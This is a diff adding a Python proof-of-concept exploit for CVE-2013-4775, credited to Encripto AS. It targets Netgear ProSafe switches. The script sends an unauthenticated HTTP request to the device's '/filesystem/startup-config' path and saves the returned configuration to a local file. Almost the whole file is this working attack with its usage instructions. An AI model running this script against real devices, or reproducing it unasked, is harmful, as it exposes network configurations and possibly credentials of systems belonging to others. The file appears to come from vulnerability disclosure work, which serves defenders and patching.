@@ -1,0 +1,107 @@
+#!/usr/bin/python
+
+################################################################
+#                                                              #
+# Netgear ProSafe - CVE-2013-4775 PoC                          #
+# written by Juan J. Guelfo @ Encripto AS                      #
+# post@encripto.no                                             #
+#                                                              #
+# Copyright 2013 Encripto AS. All rights reserved.             #
+#                                                              #
+# This software is licensed under the FreeBSD license.         #
+# http://www.encripto.no/tools/license.php                     #
+#                                                              #
+################################################################
+
+import sys, getopt, urllib2
+
+
+__version__ = "0.1"
+__author__ = "Juan J. Guelfo, Encripto AS (post@encripto.no)"
+
+
+# Prints title and other header info
+def header():
+    print ""
+    print " ================================================================= "
+    print "|  Netgear ProSafe - CVE-2013-4775 PoC \t\t\t\t  |".format(__version__)
+    print "|  by {0}\t\t  |".format(__author__)
+    print " ================================================================= "
+    print ""
+
+    
+# Prints help    
+def help():
+    header()
+    print """
+   Usage: python CVE-2013-4775.py [mandatory options]
+
+   Mandatory options:
+       -t target               ...Target IP address
+       -p port                 ...Port where the HTTP admin interface is listening on
+       -o file                 ...Output file where the config will be written to
+        
+   Example:
+       python CVE-2013-4775.py -t 192.168.0.1 -p 80 -o output.txt
+    """
+    sys.exit(0) 
+    
+    
+    
+if __name__ == '__main__':
+    
+    #Parse options
+    try:
+        options, args = getopt.getopt(sys.argv[1:], "t:p:o:", ["target=", "port=", "output="])
+
+    except getopt.GetoptError, err:
+        header()
+        print "\n[-] Error: {0}.\n".format(str(err))
+        sys.exit(1)
+    
+    if not options:
+        help()
+    
+    target = None
+    port = None
+    output = None
+    reset = None
+    for opt, arg in options:
+        if opt in ("-t"):
+            target = arg
+        
+        if opt in ("-p"):
+            port = arg    
+            
+        if opt in ("-o"):
+            output = arg  
+            
+    #Option input validation
+    if not target or not port or not output:
+        help()
+        print "[-] Error: Incorrect syntax.\n"
+        sys.exit(1)
+    
+    header()
+    print "[+] Trying to connect to {0}:{1}...".format(target, port)
+    headers = { "User-Agent" : "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)" }
+
+    try:
+        # Get the startup config via HTTP admin interface
+        r = urllib2.Request("http://%s:%s/filesystem/startup-config" % (target, port), None, headers)
+        startup_config = urllib2.urlopen(r).read()
+        print "[+] Connected..."
+        
+        # Write results to output file
+        print "[+] Writing startup config to {0}...\n".format(output)
+        fw = open(output, 'w')
+        fw.write(startup_config)
+        fw.close()
+    
+    except urllib2.URLError:
+        print "[-] Error: The connection could not be established.\n"
+        
+    except IOError as e:
+        print "[-] Error: {0}...\n".format(e.strerror)
+
+    sys.exit(0)
